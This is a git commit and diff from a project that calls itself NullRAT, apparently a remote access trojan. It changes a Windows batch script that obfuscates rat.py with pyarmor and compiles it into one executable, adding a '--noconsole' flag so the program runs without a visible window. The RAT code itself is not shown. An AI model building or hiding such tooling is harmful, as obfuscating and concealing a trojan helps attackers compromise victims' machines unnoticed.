205ff462c4d4a4441bbcae3a84e106fe713b9541
NullCode <contact.nullcode@proton.me>
2021-06-21 14:21:46 +0600

    Added noconsole flag because imo it's better
    You can remove it if you don't like it

--- Obfuscate and compile.bat
+++ Obfuscate and compile.bat
@@ -1,5 +1,5 @@
 @echo off & title Compiling RAT & color 3
 echo Compiling NullRAT
 echo ----------------- & echo.
-pyarmor pack --clean -e "--onefile " rat.py & cls 
+pyarmor pack --clean -e "--onefile --noconsole" rat.py & cls 
 if %errorlevel% == 0 (echo Successfully compiled! & exit /b 0) else (echo Not compiled successfully :[ & echo. & pause & exit /b 1)
